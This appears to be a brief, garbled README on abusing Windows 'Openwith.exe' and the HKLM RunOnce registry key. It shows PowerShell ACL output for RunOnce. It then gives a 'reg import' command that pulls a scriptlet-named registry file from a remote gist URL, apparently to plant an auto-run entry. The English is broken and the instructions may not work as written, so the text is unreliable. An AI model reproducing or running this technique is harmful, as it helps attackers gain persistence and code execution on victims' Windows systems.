### Openwith  Microsoft/Tools 
Openwith.exe is a tool for operating the program according to content policies let's go for example
If you want open anything you can put it at Openwith.exe let's go to initiative the experience

```
PS C:\> Get-ACL -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Users Allow  ReadKey
         BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         CREATOR OWNER Allow  FullControl
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         null Allow  ReadKey
Audit  :
Sddl   : null



PS C:\>
```

## At this point don't get away that you can import this registry file
C:\> reg import 
https://gist.githubusercontent.com/homjxi0e/66555fedc78af49635b2e5dfea9dd1ae/raw/60b80e88c66fe58d2d906bb24f32925edd2fe025/runonce.Scriptlet

![1231312312313123132131231321313](https://user-images.githubusercontent.com/25440152/47598884-48424780-d9a3-11e8-9816-a084b045ac71.PNG)
